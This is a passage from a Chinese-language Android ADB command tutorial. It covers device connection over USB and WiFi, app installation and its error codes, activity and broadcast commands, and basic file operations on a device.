<h4 id="414-以-root-权限运行-adbd">4.1.4 以 root 权限运行 adbd</h4>
<pre><code>adb root
复制代码
</code></pre>
<h4 id="415-指定-adb-server-的网络端口">4.1.5 指定 adb server 的网络端口</h4>
<pre><code>adb -P &lt;port&gt; start-server
复制代码
</code></pre>
<p>ADB的默认端口为 5037。</p>
<h4 id="415-查询已连接的设备模拟器列表">4.1.5 查询已连接的设备/模拟器列表</h4>
<pre><code>adb devices
复制代码
</code></pre>
<h3 id="42-设备连接管理">4.2 设备连接管理</h3>
<h4 id="421-usb-连接">4.2.1 USB 连接</h4>
<p>通过 USB 连接来正常使用 adb 需要以下步骤：</p>
<ol>
<li>确认硬件状态正常(包括 Android 设备处于正常开机状态，USB 连接线和各种接口完好)。</li>
<li>Android 设备的开发者选项和 USB 调试模式已开启(可以在「设置」-「开发者选项」-「USB调试」打开USB调试)。</li>
<li>确认设备驱动状态正常(安装ADB驱动程序)。</li>
<li>通过 USB 线连接好电脑和设备后确认状态。</li>
<li>通过 <code>adb devices</code> 命令查看设备连接情况。</li>
</ol>
<h4 id="422-wlan-连接需要-usb-线">4.2.2 WLAN 连接（需要 USB 线）</h4>
<p>借助 USB 通过 WiFi 连接来正常使用 adb 需要以下步骤：操作步骤：</p>
<ol>
<li>将 Android 设备与要运行 adb 的电脑连接到同一个 WiFi。</li>
<li>将设备与电脑通过 USB 线连接(可通过 <code>adb devices</code> 命令查看设备连接情况)。</li>
<li>通过 <code>adb tcpip 5555</code> 命令让设备在 5555 端口监听 TCP/IP 连接。</li>
<li>断开 USB 连接。</li>
<li>找到设备的 IP 地址(可以在「设置」-「关于手机」-「状态信息」-「IP地址」查看 IP 地址)。</li>
<li>通过 <code>adb connect &lt;device-ip-address&gt;</code> 命令使用 IP 地址将 Android 设备与电脑连接。</li>
<li>通过 <code>adb devices</code> 命令查看设备连接情况。</li>
<li>使用完毕后可通过 <code>adb disconnect &lt;device-ip-address&gt;</code> 命令断开无线连接。</li>
</ol>
<h4 id="423-wlan-连接无需借助-usb-线">4.2.3 WLAN 连接（无需借助 USB 线）</h4>
<p>**注：需要 root 权限。**不借助 USB 通过 WiFi 连接来正常使用 adb 需要以下步骤：</p>
<ol>
<li>在 Android 设备上安装一个终端模拟器(可通过<a href="https://link.juejin.im?target=https%3A%2F%2Fjackpal.github.io%2FAndroid-Terminal-Emulator%2F">Terminal Emulator for Android Downloads</a>下载)。</li>
<li>将 Android 设备与要运行 adb 的电脑连接到同一个 WiFi。</li>
<li>打开 Android 设备上的终端模拟器，在里面依次运行命令：</li>
</ol>
<pre><code>su
setprop service.adb.tcp.port 5555
复制代码
</code></pre>
<ol>
<li>找到设备的 IP 地址(可以在「设置」-「关于手机」-「状态信息」-「IP地址」查看 IP 地址)。</li>
<li>通过 <code>adb connect &lt;device-ip-address&gt;</code> 命令使用 IP 地址将 Android 设备与电脑连接。</li>
<li>通过 <code>adb devices</code> 命令查看设备连接情况。</li>
</ol>
<h4 id="424-wifi-连接转为-usb-连接">4.2.4 WiFi 连接转为 USB 连接</h4>
<p>通过<code>adb usb</code>命令以USB模式重新启动ADB：</p>
<pre><code>adb usb
复制代码
</code></pre>
<h3 id="43-应用管理">4.3 应用管理</h3>
<h4 id="431-查看应用列表">4.3.1 查看应用列表</h4>
<p>查看应用列表的基本命令格式是：</p>
<pre><code>adb shell pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [--user USER_ID] [FILTER]
复制代码
</code></pre>
<p><code>adb shell pm list packages</code> 后面可以跟一些可选参数进行过滤查看不同的列表，可用参数及含义如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>显示列表</th>
</tr>
</thead>
<tbody>
<tr>
<td>无</td>
<td>所有应用</td>
</tr>
<tr>
<td>-f</td>
<td>显示应用关联的 apk 文件</td>
</tr>
<tr>
<td>-d</td>
<td>只显示 disabled 的应用</td>
</tr>
<tr>
<td>-e</td>
<td>只显示 enabled 的应用</td>
</tr>
<tr>
<td>-s</td>
<td>只显示系统应用</td>
</tr>
<tr>
<td>-3</td>
<td>只显示第三方应用</td>
</tr>
<tr>
<td>-i</td>
<td>显示应用的 installer</td>
</tr>
<tr>
<td>-u</td>
<td>包含已卸载应用</td>
</tr>
<tr>
<td><code>&lt;filter&gt;</code></td>
<td>包名包含 <code>&lt;filter&gt;</code> 字符串</td>
</tr>
</tbody>
</table>
<h5 id="4311-查看所有应用">4.3.1.1 查看所有应用</h5>
<pre><code>adb shell pm list packages
复制代码
</code></pre>
<h5 id="4312-查看系统应用">4.3.1.2 查看系统应用</h5>
<pre><code>adb shell pm list packages -s
复制代码
</code></pre>
<h5 id="4313-查看第三方应用">4.3.1.3 查看第三方应用</h5>
<pre><code>adb shell pm list packages -3
复制代码
</code></pre>
<h5 id="4314-包名包含某字符串的应用">4.3.1.4 包名包含某字符串的应用</h5>
<p>比如要查看包名包含字符串 <code>huawei</code> 的应用列表，命令：</p>
<pre><code>adb shell pm list packages huawei
复制代码
</code></pre>
<h4 id="432-安装应用">4.3.2 安装应用</h4>
<p>安装应用的基本命令格式是：</p>
<pre><code>adb install [-l] [-r] [-t] [-s] [-d] [-g] &lt;apk-file&gt;
复制代码
</code></pre>
<p><code>adb install</code> 后面可以跟一些可选参数来控制安装 APK 的行为，可用参数及含义如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-l</td>
<td>将应用安装到保护目录 /mnt/asec</td>
</tr>
<tr>
<td>-r</td>
<td>允许覆盖安装</td>
</tr>
<tr>
<td>-t</td>
<td>允许安装 AndroidManifest.xml 里 application 指定 <code>android:testOnly=&quot;true&quot;</code> 的应用</td>
</tr>
<tr>
<td>-s</td>
<td>将应用安装到 sdcard</td>
</tr>
<tr>
<td>-d</td>
<td>允许降级覆盖安装</td>
</tr>
<tr>
<td>-g</td>
<td>授予所有运行时权限</td>
</tr>
</tbody>
</table>
<p>运行命令后可以看到输出内容，包含安装进度和状态，安装状态如下：</p>
<ul>
<li><code>Success</code>：代表安装成功。</li>
<li><code>Failure</code>：代表安装失败。APK 安装失败的情况有很多，<code>Failure</code>状态之后有安装失败输出代码。常见安装失败输出代码、含义及可能的解决办法如下：</li>
</ul>
<table>
<thead>
<tr>
<th>输出代码</th>
<th>含义</th>
<th>解决办法</th>
</tr>
</thead>
<tbody>
<tr>
<td>INSTALL_FAILED_ALREADY_EXISTS</td>
<td>应用已经存在，或卸载了但没卸载干净</td>
<td><code>adb install</code> 时使用 <code>-r</code> 参数，或者先 <code>adb uninstall &lt;packagename&gt;</code> 再安装</td>
</tr>
<tr>
<td>INSTALL_FAILED_INVALID_APK</td>
<td>无效的 APK 文件</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_INVALID_URI</td>
<td>无效的 APK 文件名</td>
<td>确保 APK 文件名里无中文</td>
</tr>
<tr>
<td>INSTALL_FAILED_INSUFFICIENT_STORAGE</td>
<td>空间不足</td>
<td>清理空间</td>
</tr>
<tr>
<td>INSTALL_FAILED_DUPLICATE_PACKAGE</td>
<td>已经存在同名程序</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_NO_SHARED_USER</td>
<td>请求的共享用户不存在</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_UPDATE_INCOMPATIBLE</td>
<td>以前安装过同名应用，但卸载时数据没有移除；或者已安装该应用，但签名不一致</td>
<td>先 <code>adb uninstall &lt;packagename&gt;</code> 再安装</td>
</tr>
<tr>
<td>INSTALL_FAILED_SHARED_USER_INCOMPATIBLE</td>
<td>请求的共享用户存在但签名不一致</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_MISSING_SHARED_LIBRARY</td>
<td>安装包使用了设备上不可用的共享库</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_REPLACE_COULDNT_DELETE</td>
<td>替换时无法删除</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_DEXOPT</td>
<td>dex 优化验证失败或空间不足</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_OLDER_SDK</td>
<td>设备系统版本低于应用要求</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_CONFLICTING_PROVIDER</td>
<td>设备里已经存在与应用里同名的 content provider</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_NEWER_SDK</td>
<td>设备系统版本高于应用要求</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_TEST_ONLY</td>
<td>应用是 test-only 的，但安装时没有指定 <code>-t</code> 参数</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_CPU_ABI_INCOMPATIBLE</td>
<td>包含不兼容设备 CPU 应用程序二进制接口的 native code</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_MISSING_FEATURE</td>
<td>应用使用了设备不可用的功能</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_CONTAINER_ERROR</td>
<td>1. sdcard 访问失败;2. 应用签名与 ROM 签名一致，被当作内置应用。</td>
<td>1. 确认 sdcard 可用，或者安装到内置存储;2. 打包时不与 ROM 使用相同签名。</td>
</tr>
<tr>
<td>INSTALL_FAILED_INVALID_INSTALL_LOCATION</td>
<td>1. 不能安装到指定位置;2. 应用签名与 ROM 签名一致，被当作内置应用。</td>
<td>1. 切换安装位置，添加或删除 <code>-s</code> 参数;2. 打包时不与 ROM 使用相同签名。</td>
</tr>
<tr>
<td>INSTALL_FAILED_MEDIA_UNAVAILABLE</td>
<td>安装位置不可用</td>
<td>一般为 sdcard，确认 sdcard 可用或安装到内置存储</td>
</tr>
<tr>
<td>INSTALL_FAILED_VERIFICATION_TIMEOUT</td>
<td>验证安装包超时</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_VERIFICATION_FAILURE</td>
<td>验证安装包失败</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_PACKAGE_CHANGED</td>
<td>应用与调用程序期望的不一致</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_UID_CHANGED</td>
<td>以前安装过该应用，与本次分配的 UID 不一致</td>
<td>清除以前安装过的残留文件</td>
</tr>
<tr>
<td>INSTALL_FAILED_VERSION_DOWNGRADE</td>
<td>已经安装了该应用更高版本</td>
<td>使用 <code>-d</code> 参数</td>
</tr>
<tr>
<td>INSTALL_FAILED_PERMISSION_MODEL_DOWNGRADE</td>
<td>已安装 target SDK 支持运行时权限的同名应用，要安装的版本不支持运行时权限</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_NOT_APK</td>
<td>指定路径不是文件，或不是以 <code>.apk</code> 结尾</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_BAD_MANIFEST</td>
<td>无法解析的 AndroidManifest.xml 文件</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_UNEXPECTED_EXCEPTION</td>
<td>解析器遇到异常</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_NO_CERTIFICATES</td>
<td>安装包没有签名</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES</td>
<td>已安装该应用，且签名与 APK 文件不一致</td>
<td>先卸载设备上的该应用，再安装</td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_CERTIFICATE_ENCODING</td>
<td>解析 APK 文件时遇到 <code>CertificateEncodingException</code></td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_BAD_PACKAGE_NAME</td>
<td>manifest 文件里没有或者使用了无效的包名</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_BAD_SHARED_USER_ID</td>
<td>manifest 文件里指定了无效的共享用户 ID</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_MANIFEST_MALFORMED</td>
<td>解析 manifest 文件时遇到结构性错误</td>
<td></td>
</tr>
<tr>
<td>INSTALL_PARSE_FAILED_MANIFEST_EMPTY</td>
<td>在 manifest 文件里找不到找可操作标签（instrumentation 或 application）</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_INTERNAL_ERROR</td>
<td>因系统问题安装失败</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_USER_RESTRICTED</td>
<td>用户被限制安装应用</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_DUPLICATE_PERMISSION</td>
<td>应用尝试定义一个已经存在的权限名称</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_NO_MATCHING_ABIS</td>
<td>应用包含设备的应用程序二进制接口不支持的 native code</td>
<td></td>
</tr>
<tr>
<td>INSTALL_CANCELED_BY_USER</td>
<td>应用安装需要在设备上确认，但未操作设备或点了取消</td>
<td>在设备上同意安装</td>
</tr>
<tr>
<td>INSTALL_FAILED_ACWF_INCOMPATIBLE</td>
<td>应用程序与设备不兼容</td>
<td></td>
</tr>
<tr>
<td>INSTALL_FAILED_TEST_ONLY</td>
<td>APK 文件是使用 Android Studio 直接 RUN 编译出来的文件</td>
<td>通过 Gradle 的 assembleDebug 或 assembleRelease 重新编译，或者 Generate Signed APK</td>
</tr>
<tr>
<td>does not contain AndroidManifest.xml</td>
<td>无效的 APK 文件</td>
<td></td>
</tr>
<tr>
<td>is not a valid zip file</td>
<td>无效的 APK 文件</td>
<td></td>
</tr>
<tr>
<td>Offline</td>
<td>设备未连接成功</td>
<td>先将设备与 adb 连接成功</td>
</tr>
<tr>
<td>unauthorized</td>
<td>设备未授权允许调试</td>
<td></td>
</tr>
<tr>
<td>error: device not found</td>
<td>没有连接成功的设备</td>
<td>先将设备与 adb 连接成功</td>
</tr>
<tr>
<td>protocol failure</td>
<td>设备已断开连接</td>
<td>先将设备与 adb 连接成功</td>
</tr>
<tr>
<td>Unknown option: -s</td>
<td>Android 2.2 以下不支持安装到 sdcard</td>
<td>不使用 <code>-s</code> 参数</td>
</tr>
<tr>
<td>No space left on device</td>
<td>空间不足</td>
<td>清理空间</td>
</tr>
<tr>
<td>Permission denied ... sdcard ...</td>
<td>sdcard 不可用</td>
<td></td>
</tr>
<tr>
<td>signatures do not match the previously installed version; ignoring!</td>
<td>已安装该应用且签名不一致</td>
<td>先卸载设备上的该应用，再安装</td>
</tr>
</tbody>
</table>
<p>参考：<a href="https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fandroid%2Fplatform_frameworks_base%2Fblob%2Fmaster%2Fcore%252Fjava%252Fandroid%252Fcontent%252Fpm%252FPackageManager.java">PackageManager.java</a></p>
<p><code>adb install</code> 实际是分三步完成：</p>
<ol>
<li>push apk 文件到 /data/local/tmp。</li>
<li>调用 pm install 安装。</li>
<li>删除 /data/local/tmp 下的对应 apk 文件。</li>
</ol>
<h4 id="433-卸载应用">4.3.3 卸载应用</h4>
<p>卸载应用的基本命令格式是：</p>
<pre><code>adb uninstall [-k] &lt;package-name&gt;
复制代码
</code></pre>
<p><code>&lt;package-name&gt;</code> 表示应用的包名，<code>-k</code> 参数可选，表示卸载应用但保留数据和缓存目录。</p>
<h4 id="434-清除应用数据与缓存">4.3.4 清除应用数据与缓存</h4>
<pre><code>adb shell pm clear &lt;package-name&gt;
复制代码
</code></pre>
<p><code>&lt;package-name&gt;</code> 表示应用名包，这条命令的效果相当于在设置里的应用信息界面点击了「清除缓存」和「清除数据」。</p>
<h4 id="435-查看前台-activity">4.3.5 查看前台 Activity</h4>
<pre><code>adb shell dumpsys activity activities | grep mFocusedActivity
复制代码
</code></pre>
<h4 id="436-查看正在运行的-services">4.3.6 查看正在运行的 Services</h4>
<pre><code>adb shell dumpsys activity services [&lt;package-name&gt;]
复制代码
</code></pre>
<p><code>&lt;package-name&gt;</code> 参数不是必须的，指定 <code>&lt;package-name&gt;</code> 表示查看与某个包名相关的 Services，不指定表示查看所有 Services。<code>&lt;package-name&gt;</code> 不一定要给出完整的包名，可以只给一部分，那么所给包名相关的 Services 都会列出来。</p>
<h4 id="437-查看应用详细信息">4.3.7 查看应用详细信息</h4>
<pre><code>adb shell dumpsys package &lt;package-name&gt;
复制代码
</code></pre>
<p><code>&lt;package-name&gt;</code> 表示应用包名。运行次命令的输出中包含很多信息，包括 Activity Resolver Table、Registered ContentProviders、包名、userId、安装后的文件资源代码等路径、版本信息、权限信息和授予状态、签名版本信息等。</p>
<h4 id="437-查看应用安装路径">4.3.7 查看应用安装路径</h4>
<pre><code>adb shell pm path &lt;package-name&gt;
复制代码
</code></pre>
<h3 id="44-与应用交互">4.4 与应用交互</h3>
<p>与应用交互主要是使用 <code>am &lt;command&gt;</code> 命令，常用的 <code>&lt;command&gt;</code> 如下：</p>
<table>
<thead>
<tr>
<th>command</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>start [options] &lt;intent&gt;</code></td>
<td>启动 <code>&lt;intent&gt;</code> 指定的 Activity</td>
</tr>
<tr>
<td><code>startservice [options] &lt;intent&gt;</code></td>
<td>启动 <code>&lt;intent&gt;</code> 指定的 Service</td>
</tr>
<tr>
<td><code>broadcast [options] &lt;intent&gt;</code></td>
<td>发送 <code>&lt;intent&gt;</code> 指定的广播</td>
</tr>
<tr>
<td><code>force-stop &lt;package-name&gt;</code></td>
<td>停止 <code>&lt;package-name&gt;</code> 相关的进程</td>
</tr>
</tbody>
</table>
<p><code>&lt;intent&gt;</code> 参数很灵活，和写 Android 程序时代码里的 Intent 相对应。</p>
<p>用于决定 intent 对象的选项如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-a &lt;action&gt;</code></td>
<td>指定 action，比如 <code>android.intent.action.VIEW</code></td>
</tr>
<tr>
<td><code>-c &lt;category&gt;</code></td>
<td>指定 category，比如 <code>android.intent.category.APP_CONTACTS</code></td>
</tr>
<tr>
<td><code>-n &lt;component&gt;</code></td>
<td>指定完整 component 名，用于明确指定启动哪个 Activity</td>
</tr>
</tbody>
</table>
<p><code>&lt;intent&gt;</code> 里还能带数据，就像写代码时的 Bundle 一样：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>--esn &lt;extra-key&gt;</code></td>
<td>null 值(只有 key 名)</td>
</tr>
<tr>
<td><code>-e|--es &lt;extra-key&gt; &lt;extra-string-value&gt;</code></td>
<td>string 值</td>
</tr>
<tr>
<td><code>--ez &lt;extra-key&gt; &lt;extra-boolean-value&gt;</code></td>
<td>boolean 值</td>
</tr>
<tr>
<td><code>--ei &lt;extra-key&gt; &lt;extra-int-value&gt;</code></td>
<td>integer 值</td>
</tr>
<tr>
<td><code>--el &lt;extra-key&gt; &lt;extra-long-value&gt;</code></td>
<td>long 值</td>
</tr>
<tr>
<td><code>--ef &lt;extra-key&gt; &lt;extra-float-value&gt;</code></td>
<td>float 值</td>
</tr>
<tr>
<td><code>--eu &lt;extra-key&gt; &lt;extra-uri-value&gt;</code></td>
<td>URI</td>
</tr>
<tr>
<td><code>--ecn &lt;extra-key&gt; &lt;extra-component-name-value&gt;</code></td>
<td>component name</td>
</tr>
<tr>
<td><code>--eia &lt;extra-key&gt; &lt;extra-int-value&gt;[,&lt;extra-int-value...]</code></td>
<td>integer 数组</td>
</tr>
<tr>
<td><code>--ela &lt;extra-key&gt; &lt;extra-long-value&gt;[,&lt;extra-long-value...]</code></td>
<td>long 数组</td>
</tr>
</tbody>
</table>
<h4 id="441-启动应用-调起-activity">4.4.1 启动应用/ 调起 Activity</h4>
<pre><code>adb shell am start [options] &lt;intent&gt;
复制代码
</code></pre>
<p>例如：</p>
<pre><code>adb shell am start -a android.settings.SETTINGS                   # 打开系统设置页面
adb shell am start -a android.intent.action.DIAL -d tel:10086     # 打开拨号页面
adb shell am start -n com.android.mms/.ui.ConversationList        # 打开短信会话列表
复制代码
</code></pre>
<p>options 是一些改变其行为的选项，支持的可选参数及含义如下：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-D</td>
<td>启用调试</td>
</tr>
<tr>
<td>-W</td>
<td>等待启动完成</td>
</tr>
<tr>
<td>--start-profiler <code>file</code></td>
<td>启动分析器并将结果发送到 <code>file</code></td>
</tr>
<tr>
<td>-P <code>file</code></td>
<td>类似于 --start-profiler，但当应用进入空闲状态时分析停止</td>
</tr>
<tr>
<td>-R <code>count</code></td>
<td>重复 Activity 启动次数</td>
</tr>
<tr>
<td>-S</td>
<td>启动 Activity 前强行停止目标应用</td>
</tr>
<tr>
<td>--opengl-trace</td>
<td>启用 OpenGL 函数的跟踪</td>
</tr>
<tr>
<td>--user <code>user_id</code> | current</td>
<td>指定要作为哪个用户运行；如果未指定，则作为当前用户运行</td>
</tr>
</tbody>
</table>
<h4 id="442-调起-service">4.4.2 调起 Service</h4>
<pre><code>adb shell am startservice [options] &lt;intent&gt;
复制代码
</code></pre>
<p>一个典型的用例是如果设备上原本应该显示虚拟按键但是没有显示，可以试试这个：</p>
<pre><code>adb shell am startservice -n com.android.systemui/.SystemUIService
复制代码
</code></pre>
<h4 id="443-停止-service">4.4.3 停止 Service</h4>
<pre><code>adb shell am stopservice [options] &lt;intent&gt;
复制代码
</code></pre>
<h4 id="444-发送广播">4.4.4 发送广播</h4>
<pre><code>adb shell am broadcast [options] &lt;INTENT&gt;
复制代码
</code></pre>
<p>可以向所有组件广播，也可以只向指定组件广播。</p>
<p>例如，向所有组件广播 <code>BOOT_COMPLETED</code>：</p>
<pre><code>adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
复制代码
</code></pre>
<p>又例如，只向 <code>com.android.receiver.test/.BootCompletedReceiver</code> 广播 <code>BOOT_COMPLETED</code>：</p>
<pre><code>adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -n com.android.receiver.test/.BootCompletedReceiver
复制代码
</code></pre>
<p>这类用法在测试的时候很实用，比如某个广播的场景很难制造，可以考虑通过这种方式来发送广播。</p>
<p>既能发送系统预定义的广播，也能发送自定义广播。如下是部分系统预定义广播及正常触发时机：</p>
<table>
<thead>
<tr>
<th>action</th>
<th>触发时机</th>
</tr>
</thead>
<tbody>
<tr>
<td>android.net.conn.CONNECTIVITY_CHANGE</td>
<td>网络连接发生变化</td>
</tr>
<tr>
<td>android.intent.action.SCREEN_ON</td>
<td>屏幕点亮</td>
</tr>
<tr>
<td>android.intent.action.SCREEN_OFF</td>
<td>屏幕熄灭</td>
</tr>
<tr>
<td>android.intent.action.BATTERY_LOW</td>
<td>电量低，会弹出电量低提示框</td>
</tr>
<tr>
<td>android.intent.action.BATTERY_OKAY</td>
<td>电量恢复了</td>
</tr>
<tr>
<td>android.intent.action.BOOT_COMPLETED</td>
<td>设备启动完毕</td>
</tr>
<tr>
<td>android.intent.action.DEVICE_STORAGE_LOW</td>
<td>存储空间过低</td>
</tr>
<tr>
<td>android.intent.action.DEVICE_STORAGE_OK</td>
<td>存储空间恢复</td>
</tr>
<tr>
<td>android.intent.action.PACKAGE_ADDED</td>
<td>安装了新的应用</td>
</tr>
<tr>
<td>android.net.wifi.STATE_CHANGE</td>
<td>WiFi连接状态发生变化</td>
</tr>
<tr>
<td>android.net.wifi.WIFI_STATE_CHANGED</td>
<td>WiFi状态变为启用/关闭/正在启动/正在关闭/未知</td>
</tr>
<tr>
<td>android.intent.action.BATTERY_CHANGED</td>
<td>电池电量发生变化</td>
</tr>
<tr>
<td>android.intent.action.INPUT_METHOD_CHANGED</td>
<td>系统输入法发生变化</td>
</tr>
<tr>
<td>android.intent.action.ACTION_POWER_CONNECTED</td>
<td>外部电源连接</td>
</tr>
<tr>
<td>android.intent.action.ACTION_POWER_DISCONNECTED</td>
<td>外部电源断开连接</td>
</tr>
<tr>
<td>android.intent.action.DREAMING_STARTED</td>
<td>系统开始休眠</td>
</tr>
<tr>
<td>android.intent.action.DREAMING_STOPPED</td>
<td>系统停止休眠</td>
</tr>
<tr>
<td>android.intent.action.WALLPAPER_CHANGED</td>
<td>壁纸发生变化</td>
</tr>
<tr>
<td>android.intent.action.HEADSET_PLUG</td>
<td>插入耳机</td>
</tr>
<tr>
<td>android.intent.action.MEDIA_UNMOUNTED</td>
<td>卸载外部介质</td>
</tr>
<tr>
<td>android.intent.action.MEDIA_MOUNTED</td>
<td>挂载外部介质</td>
</tr>
<tr>
<td>android.os.action.POWER_SAVE_MODE_CHANGED</td>
<td>省电模式开启</td>
</tr>
</tbody>
</table>
<p><em>（以上广播均可使用 adb 触发）</em></p>
<h4 id="445-强制停止应用">4.4.5 强制停止应用</h4>
<pre><code>adb shell am force-stop &lt;packagename&gt;
复制代码
</code></pre>
<h4 id="446-收紧内存">4.4.6 收紧内存</h4>
<pre><code>adb shell am send-trim-memory  &lt;pid&gt; &lt;level&gt;
复制代码
</code></pre>
<p>参数说明：</p>
<ul>
<li><code>pid</code>: 进程 ID</li>
<li><code>level</code>:HIDDEN、RUNNING_MODERATE、BACKGROUND、RUNNING_LOW、MODERATE、RUNNING_CRITICAL、COMPLETE</li>
</ul>
<h3 id="45-文件管理">4.5 文件管理</h3>
<h4 id="451-从模拟器设备下载指定的文件到计算机">4.5.1 从模拟器/设备下载指定的文件到计算机</h4>
<p>从模拟器/设备下载指定的文件到计算机的基本命令格式是：</p>
<pre><code>adb pull &lt;remote&gt; [local]
复制代码
</code></pre>
<p>参数说明：</p>
<ul>
<li><code>remote</code>: 模拟器/设备里的文件路径</li>
<li><code>local</code>:计算机上的目录，参数可以省略，默认复制到当前目录</li>
</ul>
<p>例如，将 /sdcard/music.mp4 下载到计算机的当前目录：</p>
<pre><code>adb pull /sdcard/music.mp4
复制代码
</code></pre>
<p>将 /sdcard/music.mp4 下载到计算机的当前目录(目录需存在)：</p>
<pre><code>adb pull /sdcard/music.mp4 D:\Download
复制代码
</code></pre>
<h4 id="452-将指定的文件从计算机上传到模拟器设备">4.5.2 将指定的文件从计算机上传到模拟器/设备</h4>
<p>将指定的文件从计算机上传到模拟器/设备的基本命令格式是：</p>
<pre><code>adb push &lt;local&gt; &lt;remote&gt;
复制代码
</code></pre>
<p>参数说明：</p>
<ul>
<li><code>local</code>:计算机上的文件路径</li>
<li><code>remote</code>: 模拟器/设备里的目录</li>
</ul>
<p>例如，将 D:\Download\music.mp4 下载到设备的/sdcard/music/目录：</p>
<pre><code>adb push D:\Download\music.mp4 /sdcard/music/
复制代码
</code></pre>
<h4 id="454-列出指定目录的内容">4.5.4 列出指定目录的内容</h4>
<p>列出模拟器/设备上指定目录的内容的基本命令格式是：</p>
<pre><code>adb shell ls [options] &lt;directory&gt;
复制代码
</code></pre>
<p><code>&lt;directory&gt;</code> 表示指定目录，可以省略，表示列出根目录下的所有文件和目录。<code>adb shell ls</code> 后面可以跟一些可选参数进行过滤查看不同的列表，可用参数及含义如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>显示列表</th>
</tr>
</thead>
<tbody>
<tr>
<td>无</td>
<td>列出目录下的所有文件和目录</td>
</tr>
<tr>
<td>-a</td>
<td>列出目录下的所有文件(包括隐藏的)</td>
</tr>
<tr>
<td>-i</td>
<td>列出目录下的所有文件和索引编号</td>
</tr>
<tr>
<td>-s</td>
<td>列出目录下的所有文件和文件大小</td>
</tr>
<tr>
<td>-n</td>
<td>列出目录下的所有文件及其 UID和 GID</td>
</tr>
<tr>
<td>-R</td>
<td>列出目录下的所有子目录中的文件</td>
</tr>
</tbody>
</table>
<h4 id="455-切换到目标目录">4.5.5 切换到目标目录</h4>
<pre><code>adb shell cd &lt;directory&gt;
复制代码
</code></pre>
<p>第一步：执行<code>adb shell</code>命令；第二步：执行<code>cd &lt;directory&gt;</code>命令切换到目标目录。</p>
<h4 id="456-删除文件或目录">4.5.6 删除文件或目录</h4>
<pre><code>adb shell rm [options] &lt;files or directory&gt;
复制代码
</code></pre>
<p>第一步：执行<code>adb shell</code>命令；第二步：执行<code>rm [options] &lt;files or directory&gt;</code>命令删除文件或目录。</p>
<p><code>rm</code> 后面可以跟一些可选参数进行不同的操作，可用参数及含义如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>无</td>
<td>删除文件</td>
</tr>
<tr>
<td>-f</td>
<td>强制删除文件，系统不提示</td>
</tr>
<tr>
<td>-r</td>
<td>强制删除指定目录中的所有文件和子目录</td>
</tr>
<tr>
<td>-d</td>
<td>删除指定目录，即使它是一个非空目录</td>
</tr>
<tr>
<td>-i</td>
<td>交互式删除，删除前提示</td>
</tr>
</tbody>
</table>
<p><code>rm -d</code> 等同于 <code>rmdir</code> 命令，有些版本不包含<code>-d</code> 参数。</p>
<h4 id="457-创建目录">4.5.7 创建目录</h4>
<pre><code>adb shell mkdir [options] &lt;directory-name&gt;
复制代码
</code></pre>
<p>第一步：执行<code>adb shell</code>命令；第二步：执行<code>mkdir [options] &lt;directory-name&gt;</code>命令创建目录。<code>mkdir</code> 后面可以跟一些可选参数进行不同的操作，可用参数及含义如下：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>无</td>
<td>创建指定目录</td>
</tr>
<tr>
<td>-m</td>
<td>创建指定目录并赋予读写权限</td>
</tr>
<tr>
<td>-p</td>
<td>创建指定目录及其父目录</td>
</tr>
</tbody>
</table>
<h4 id="458-创建空文件或改变文件时间戳">4.5.8 创建空文件或改变文件时间戳</h4>
<pre><code>adb shell touch [options] &lt;file&gt;
复制代码
</code></pre>
<p>第一步：执行<code>adb shell</code>命令；第二步：执行<code>touch [options] &lt;file&gt;</code>命令创建空文件或改变文件时间戳。</p>
<p>可通过<code>ls -n &lt;directory&gt;</code> 命令查看文件的时间。</p>
